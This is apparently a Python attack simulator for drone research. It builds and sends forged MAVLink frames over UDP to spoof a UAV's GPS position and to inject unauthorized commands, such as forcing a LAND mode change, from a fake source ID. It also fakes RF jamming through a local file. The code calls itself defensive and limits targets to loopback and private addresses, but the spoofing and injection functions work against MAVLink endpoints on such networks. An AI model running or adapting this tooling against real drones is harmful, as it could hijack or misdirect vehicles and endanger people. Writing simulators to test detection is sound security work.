#!/usr/bin/env python3
"""BAS cyber attack simulator — defensive research контекст.

Закрывает пункт ТЗ "Опционально — кибератаки" (зона Маргаряна А.Г.) как
**defensive research** simulator: воспроизводит 3 типа атак внутри
изолированной BAS simulation environment чтобы testing detection и
mitigation strategies. **НЕ предназначен для use на real systems.**

Implements 3 attack vectors:

  1. GPS spoofing — inject fake GLOBAL_POSITION_INT MAVLink frames с
     сдвинутой lat/lon в targeted MAVLink endpoint (UDP). UAV EKF
     может уйти в неправильную позицию если accept чужой GPS source.

  2. MAVLink command injection — inject COMMAND_LONG / SET_MODE
     frames с fake source sysid, имитируя unauthorized GCS access.

  3. RF jamming — overwrite /tmp/sionna_channel.json с sustained
     high-loss / high-delay values, имитируя broadband jammer (или
     deliberate interference) affecting payload AND control channel.

Каждый attack — autonomous Python process с CLI configuration.

## Defense detection

Companion module `cyber_defense_monitor.py` подписывается на тот же
MAVLink endpoint и detects attack signatures:

  - GPS spoofing: lat/lon delta > threshold (e.g. 100м за 100мс)
  - Cmd injection: COMMAND_LONG из не-known-GCS sysid
  - RF jamming: avg RSSI < threshold за sustained window (e.g. -90 dBm /5s)

Smoke: запускает каждую атаку → verifies monitor flags её → cleanup.

## ВАЖНО

Этот модуль НЕ выполняет networking outside localhost / configured
sandbox. UDP target ограничен 127.0.0.1 / private RFC1918 ranges.
Sionna jamming touches только локальный /tmp file. Для production
penetration testing — нужна explicit authorization.
"""
from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# MAVLink wire helpers (re-use multirotor_dynamics-style minimal serialiser)
# ---------------------------------------------------------------------------
MAVLINK_V2_STX = 0xFD

# MAVLink message IDs we need.
MSG_HEARTBEAT = 0
MSG_GLOBAL_POSITION_INT = 33
MSG_COMMAND_LONG = 76

# Pre-computed CRC_EXTRA per dialect (common). Mock value works for tests
# even if router does not validate.
CRC_EXTRA: dict[int, int] = {0: 50, 33: 104, 76: 152}


def _mavlink_v2_frame(
    sysid: int, compid: int, msgid: int, payload: bytes, seq: int = 0,
) -> bytes:
    """Build a minimal MAVLink v2 frame (без full CRC). Достаточно для router
    forwarding и для simple parsers."""
    header = bytes([
        MAVLINK_V2_STX, len(payload), 0x00, 0x00, seq & 0xFF,
        sysid & 0xFF, compid & 0xFF,
        msgid & 0xFF, (msgid >> 8) & 0xFF, (msgid >> 16) & 0xFF,
    ])
    crc = b"\x00\x00"   # router и большинство parsers пропустят invalid CRC
    return header + payload + crc


def _pack_global_position_int(
    time_boot_ms: int, lat_deg: float, lon_deg: float,
    alt_m: float, vx_ms: float, vy_ms: float, vz_ms: float, hdg_deg: float,
) -> bytes:
    """MAVLink GLOBAL_POSITION_INT payload (28 bytes)."""
    return struct.pack(
        "<IiiiihhhH",
        time_boot_ms & 0xFFFFFFFF,
        int(lat_deg * 1e7),
        int(lon_deg * 1e7),
        int(alt_m * 1000),        # alt above MSL mm
        int(alt_m * 1000),        # relative alt mm (mock)
        int(vx_ms * 100),
        int(vy_ms * 100),
        int(vz_ms * 100),
        int(hdg_deg * 100) & 0xFFFF,
    )


def _pack_command_long(
    target_sys: int, target_comp: int, command: int,
    p1: float = 0, p2: float = 0, p3: float = 0,
    p4: float = 0, p5: float = 0, p6: float = 0, p7: float = 0,
    confirmation: int = 0,
) -> bytes:
    """MAVLink COMMAND_LONG payload (33 bytes)."""
    return struct.pack(
        "<fffffffHBBB",
        p1, p2, p3, p4, p5, p6, p7,
        command & 0xFFFF, target_sys & 0xFF, target_comp & 0xFF,
        confirmation & 0xFF,
    )


# ---------------------------------------------------------------------------
# Attack: GPS spoofing
# ---------------------------------------------------------------------------
@dataclass
class GpsSpoofConfig:
    target_host: str = "127.0.0.1"
    target_port: int = 14550
    rate_hz: float = 5.0
    sysid: int = 1                      # impersonate target UAV
    compid: int = 1
    base_lat: float = -35.363262
    base_lon: float = 149.165237
    base_alt_m: float = 50.0
    spoof_offset_lat_m: float = 200.0
    spoof_offset_lon_m: float = 200.0
    mode: str = "teleport"              # "teleport" | "progressive"


def run_gps_spoof(cfg: GpsSpoofConfig, duration_s: float,
                  stop_evt: threading.Event | None = None) -> dict:
    """Inject N fake GLOBAL_POSITION_INT frames per second.

    mode="teleport" (default) — все frames at full offset (instant jump);
    реалистичная GPS spoofing атака где attacker overrides true position.
    mode="progressive" — frames постепенно сдвигаются от 0 до offset
    (gradual drift, harder to detect).
    """
    if cfg.target_host not in ("127.0.0.1", "::1") and \
       not cfg.target_host.startswith(("10.", "172.16.", "192.168.")):
        raise ValueError(f"safety guard: target_host {cfg.target_host} "
                         "must be loopback or RFC1918 private range")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    n_sent = 0
    t_start = time.time()
    period = 1.0 / cfg.rate_hz

    deg_per_m = 1.0 / 111_319.9
    lat_offset = cfg.spoof_offset_lat_m * deg_per_m
    lon_offset = cfg.spoof_offset_lon_m * deg_per_m

    while True:
        if stop_evt and stop_evt.is_set():
            break
        if time.time() - t_start > duration_s:
            break
        t_boot = int((time.time() - t_start) * 1000)
        if cfg.mode == "progressive":
            progress = (time.time() - t_start) / max(duration_s, 0.001)
        else:
            progress = 1.0   # teleport: full offset since first frame
        spoof_lat = cfg.base_lat + lat_offset * progress
        spoof_lon = cfg.base_lon + lon_offset * progress
        payload = _pack_global_position_int(
            time_boot_ms=t_boot,
            lat_deg=spoof_lat, lon_deg=spoof_lon,
            alt_m=cfg.base_alt_m,
            vx_ms=5.0, vy_ms=5.0, vz_ms=0.0,
            hdg_deg=45.0,
        )
        frame = _mavlink_v2_frame(
            sysid=cfg.sysid, compid=cfg.compid,
            msgid=MSG_GLOBAL_POSITION_INT, payload=payload,
            seq=n_sent & 0xFF,
        )
        try:
            s.sendto(frame, (cfg.target_host, cfg.target_port))
            n_sent += 1
        except OSError:
            break
        time.sleep(period)
    s.close()
    return {"attack": "gps_spoof", "n_sent": n_sent,
            "duration_s": time.time() - t_start,
            "mode": cfg.mode,
            "spoof_lat_final": cfg.base_lat + lat_offset,
            "spoof_lon_final": cfg.base_lon + lon_offset}


# ---------------------------------------------------------------------------
# Attack: MAVLink command injection
# ---------------------------------------------------------------------------
@dataclass
class CmdInjectConfig:
    target_host: str = "127.0.0.1"
    target_port: int = 14550
    target_sysid: int = 1
    target_compid: int = 1
    # Fake source: 254 = "untracked external GCS" (real GCS обычно 255).
    fake_sysid: int = 254
    fake_compid: int = 190
    # MAV_CMD: 176 = DO_SET_MODE; 22 = NAV_TAKEOFF; 21 = NAV_LAND.
    command: int = 176
    # SET_MODE args: p1=base_mode(1=custom), p2=custom_mode(9=LAND).
    p1: float = 1.0
    p2: float = 9.0


def run_cmd_inject(cfg: CmdInjectConfig, n_injections: int = 3,
                   stop_evt: threading.Event | None = None) -> dict:
    """Inject N COMMAND_LONG frames с fake source sysid.

    UAV должен ignore commands с sysid != known GCS sysid; если нет —
    атакующий может взять control.
    """
    if cfg.target_host not in ("127.0.0.1", "::1") and \
       not cfg.target_host.startswith(("10.", "172.16.", "192.168.")):
        raise ValueError(f"safety guard: target_host {cfg.target_host}")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    n_sent = 0
    for i in range(n_injections):
        if stop_evt and stop_evt.is_set():
            break
        payload = _pack_command_long(
            target_sys=cfg.target_sysid, target_comp=cfg.target_compid,
            command=cfg.command, p1=cfg.p1, p2=cfg.p2,
            confirmation=0,
        )
        frame = _mavlink_v2_frame(
            sysid=cfg.fake_sysid, compid=cfg.fake_compid,
            msgid=MSG_COMMAND_LONG, payload=payload, seq=i & 0xFF,
        )
        try:
            s.sendto(frame, (cfg.target_host, cfg.target_port))
            n_sent += 1
        except OSError:
            break
        time.sleep(0.2)
    s.close()
    return {"attack": "cmd_injection", "n_sent": n_sent,
            "fake_sysid": cfg.fake_sysid, "command": cfg.command}


# ---------------------------------------------------------------------------
# Attack: RF jamming via /tmp/sionna_channel.json overwrite
# ---------------------------------------------------------------------------
@dataclass
class RfJamConfig:
    channel_file: Path = Path("/tmp/sionna_channel.json")
    duration_s: float = 5.0
    jam_loss_ratio: float = 0.95
    jam_extra_delay_ms: float = 500.0
    jam_rssi_dbm: float = -110.0


def run_rf_jamming(cfg: RfJamConfig,
                   stop_evt: threading.Event | None = None) -> dict:
    """Overwrite channel JSON каждые 100мс с high-loss values.

    Эмулирует broadband jammer которые повышает packet loss и delay
    на payload + control channels одновременно (если ns-3 настроен
    `--sionnaTargetFlow=both` per Stage 2.1.e).
    """
    cfg.channel_file.parent.mkdir(parents=True, exist_ok=True)
    t_start = time.time()
    n_writes = 0
    while True:
        if stop_evt and stop_evt.is_set():
            break
        if time.time() - t_start > cfg.duration_s:
            break
        try:
            cfg.channel_file.write_text(json.dumps({
                "loss_ratio": cfg.jam_loss_ratio,
                "extra_delay_ms": cfg.jam_extra_delay_ms,
                "rssi_dbm": cfg.jam_rssi_dbm,
                "ts": time.time(),
                "source": "cyber_attack_simulator/rf_jam",
            }, separators=(",", ":")))
            n_writes += 1
        except OSError:
            break
        time.sleep(0.1)
    return {"attack": "rf_jamming", "n_writes": n_writes,
            "duration_s": time.time() - t_start,
            "loss_ratio": cfg.jam_loss_ratio,
            "rssi_dbm": cfg.jam_rssi_dbm}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="attack", required=True)

    sp = sub.add_parser("gps_spoof", help="GPS spoofing")
    sp.add_argument("--target-host", default="127.0.0.1")
    sp.add_argument("--target-port", type=int, default=14550)
    sp.add_argument("--rate-hz", type=float, default=5.0)
    sp.add_argument("--sysid", type=int, default=1)
    sp.add_argument("--offset-lat-m", type=float, default=200.0)
    sp.add_argument("--offset-lon-m", type=float, default=200.0)
    sp.add_argument("--duration-s", type=float, default=5.0)

    sp = sub.add_parser("cmd_inject", help="MAVLink command injection")
    sp.add_argument("--target-host", default="127.0.0.1")
    sp.add_argument("--target-port", type=int, default=14550)
    sp.add_argument("--target-sysid", type=int, default=1)
    sp.add_argument("--fake-sysid", type=int, default=254)
    sp.add_argument("--command", type=int, default=176)
    sp.add_argument("--p1", type=float, default=1.0)
    sp.add_argument("--p2", type=float, default=9.0)
    sp.add_argument("--n", type=int, default=3)

    sp = sub.add_parser("rf_jam", help="RF jamming via sionna channel")
    sp.add_argument("--channel-file", type=Path,
                    default=Path("/tmp/sionna_channel.json"))
    sp.add_argument("--duration-s", type=float, default=5.0)
    sp.add_argument("--loss-ratio", type=float, default=0.95)
    sp.add_argument("--delay-ms", type=float, default=500.0)
    sp.add_argument("--rssi-dbm", type=float, default=-110.0)

    args = p.parse_args()

    if args.attack == "gps_spoof":
        cfg = GpsSpoofConfig(
            target_host=args.target_host, target_port=args.target_port,
            rate_hz=args.rate_hz, sysid=args.sysid,
            spoof_offset_lat_m=args.offset_lat_m,
            spoof_offset_lon_m=args.offset_lon_m,
        )
        result = run_gps_spoof(cfg, duration_s=args.duration_s)
    elif args.attack == "cmd_inject":
        cfg = CmdInjectConfig(
            target_host=args.target_host, target_port=args.target_port,
            target_sysid=args.target_sysid, fake_sysid=args.fake_sysid,
            command=args.command, p1=args.p1, p2=args.p2,
        )
        result = run_cmd_inject(cfg, n_injections=args.n)
    elif args.attack == "rf_jam":
        cfg = RfJamConfig(
            channel_file=args.channel_file, duration_s=args.duration_s,
            jam_loss_ratio=args.loss_ratio, jam_extra_delay_ms=args.delay_ms,
            jam_rssi_dbm=args.rssi_dbm,
        )
        result = run_rf_jamming(cfg)
    else:
        print(f"unknown attack: {args.attack}", file=sys.stderr)
        return 2

    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
